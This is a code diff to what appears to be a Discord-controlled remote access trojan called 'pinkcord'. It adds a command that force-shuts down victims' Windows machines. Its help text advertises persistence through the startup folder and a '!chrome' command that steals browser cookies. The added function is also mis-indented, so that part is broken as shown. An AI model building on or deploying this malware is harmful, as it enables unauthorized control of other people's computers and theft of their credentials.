@@ -373,6 +373,15 @@ while True:
                 nowaSesja = " ".join(args)
                 await ctx.send("session name changed " + sesja + " to " + nowaSesja)
                 sesja = nowaSesja
+
+        @bot.command()
+async def shutdown(ctx, session):
+    if session == "all":
+        os.system("shutdown /s /f /t 1")
+    else:
+        if session == sesja:
+            os.system("shutdown /s /f /t 1")
+        
         @bot.command()
         async def h(ctx):
             wiadomosc = '''
@@ -396,6 +405,7 @@ while True:
 !sessions - Displays all sessions.
 !rename [session] [new_name] - Changes the name of a session.
 !startup [session] [file path] - copy file to startup folder (you can copy pinkcord exe file)
+!shutdown [session] - Shut down the remote computer.
 !chrome [session] [action(cookie)] - steals selected data from chrome
             '''
             await ctx.send(wiadomosc)
